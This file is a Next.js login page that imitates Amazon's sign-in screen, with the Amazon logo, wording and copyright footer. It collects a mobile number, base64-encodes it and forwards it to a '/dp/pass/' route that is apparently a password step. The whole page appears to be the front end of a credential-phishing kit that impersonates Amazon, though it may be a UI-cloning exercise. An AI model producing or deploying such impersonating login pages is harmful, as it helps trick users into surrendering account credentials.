"use client";
import React, { useState } from "react";
import { useRouter } from "next/navigation";
import Image from "next/image";

const page: React.FC = () => {
  const router = useRouter();
  const [number, setNumber] = useState(0);

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    const encoded = btoa(String(number)).replace(/=/g, "");
    router.push(`/dp/pass/${encoded}`);
    // router.push("/");
  };

  return (
    <div className="flex flex-col items-center py-6">
      <div className="flex justify-center mb-4">
        <Image src="/logo.png" alt="Amazon Logo" width={120} height={40} />
      </div>
      <div className="w-80 md:w-100 bg-white p-6 border border-gray-200 rounded-lg">
        <h1 className="text-2xl font-medium mb-6">Sign in or create account</h1>

        <form onSubmit={handleSubmit} className="flex flex-col">
          <label htmlFor="identifier" className="text-sm mb-2 font-bold">
            Enter your mobile number
          </label>
          {/* <input
            id="identifier"
            name="identifier"
            type="text"
            className="h-10 px-3 text-base border border-gray-300 rounded mb-4 focus:outline-none focus:ring-2 focus:ring-yellow-400"
            onChange={(e) => {
              setNumber(Number(e.target.value));
            }}
          /> */}

          <input
            id="identifier"
            type="tel"
            inputMode="numeric"
            maxLength={10}
            minLength={10}
            className="w-full px-3 py-2 mb-5 border rounded focus:outline-none focus:ring-2 focus:ring-yellow-400"
            placeholder="Enter 10‑digit number"
            onChange={(e) => {
              setNumber(Number(e.target.value));
            }}
          />

          <button
            type="submit"
            className="h-10 bg-yellow-400 border border-yellow-500 rounded text-base font-medium hover:bg-yellow-500"
          >
            Continue
          </button>
        </form>

        <p className="text-sm mt-4">
          By continuing, you agree to Amazon's{" "}
          <a href="/" className="text-blue-600 underline underline-offset-1">
            Conditions of Use
          </a>{" "}
          and{" "}
          <a href="/" className="text-blue-600 underline underline-offset-1">
            Privacy Notice
          </a>
          .
        </p>

        <div className="text-sm mt-3">
          <div className="font-bold">Buying for work? </div>
          <a href="/" className="text-blue-600 hover:underline">
            Create a free business account
          </a>
        </div>
      </div>
      <hr className="w-full border-t border-gray-300 mb-7 mt-11" />
      <footer className="text-center text-xs text-gray-600">
        <div className="space-x-4">
          <a href="/" className="hover:underline">
            Conditions of Use
          </a>
          <a href="/" className="hover:underline">
            Privacy Notice
          </a>
          <a href="/" className="hover:underline">
            Help
          </a>
        </div>
        <p className="mt-2">© 1996–2025, Amazon.com, Inc. or its affiliates</p>
      </footer>
    </div>
  );
};

export default page;
